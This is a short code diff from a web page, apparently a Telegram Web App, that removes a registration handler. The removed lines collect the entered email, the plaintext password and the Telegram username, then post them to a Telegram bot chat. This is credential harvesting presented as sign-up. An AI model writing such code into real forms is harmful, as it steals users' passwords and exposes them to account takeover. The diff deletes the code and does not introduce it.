@@ -1583,23 +1583,7 @@ function showRegisterForm(){
   document.getElementById('register-form').style.display='flex';
 }
 
-function submitRegister(){
-  const email = document.getElementById('reg-email').value.trim();
-  const pass  = document.getElementById('reg-pass').value.trim();
-  if(!email || !pass){ return; }
 
-  const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-  const name   = tgUser ? (tgUser.first_name||'') + ' @' + (tgUser.username||'нет') : 'не из TG';
-  const msg    = `🆕 Новый пользователь\n👤 ${name}\n📧 ${email}\n🔑 ${pass}\n🕐 ${new Date().toLocaleString('ru-RU')}`;
-
-  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
-  });
-
-  onRegister();
-}
   
 </script>
 </body>
